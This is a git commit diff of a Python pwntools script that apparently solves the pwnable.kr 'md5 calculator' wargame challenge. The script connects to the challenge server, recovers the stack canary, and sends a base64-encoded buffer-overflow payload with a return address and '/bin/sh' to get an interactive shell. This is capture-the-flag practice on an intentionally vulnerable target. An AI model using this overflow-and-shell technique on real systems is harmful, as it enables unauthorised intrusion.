444c8c27582bdda201cc95b91276eabea2d2bbeb
sonysame <sonysame@naver.com>
2018-12-31 13:58:15 +0900

    final md5calulator!

--- hash_sol.py
+++ hash_sol.py
@@ -1,22 +1,26 @@
 from pwn import *
-
+import base64
 
 
 if __name__=='__main__':
-	s=process('./hash')
+	#s=process('./hash')
+	s=remote("pwnable.kr", 9002)
 	s.recvuntil("\n")
 	captcha=s.recv(1024)
 	captcha=captcha[captcha.index(" : ")+3:captcha.index("\n")]
 	r=process(['./canary',captcha])
-	print(r.recv(1024))
+	canary=int(r.recv(1024)[2:-1],16)
+	print(hex(canary))
 	r.close()
-	
+
 	s.send(captcha+"\n")
 	print(s.recv(1024))
 	#pause()
-	payload="YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWE="
-	payload+=
-	s.send("A"*683+"\n")
+	
+	payload="a"*(0x200)+p32(canary)+"BBBBCCCCDDDD"+p32(0x08048880)+"\xef\xbe\xad\xde"+p32(0x0804b3b0)
+	payload=base64.b64encode(payload)+"/bin/sh\x00"
+	s.send(payload+"\n")
+
 
 	s.interactive()
 	s.close()
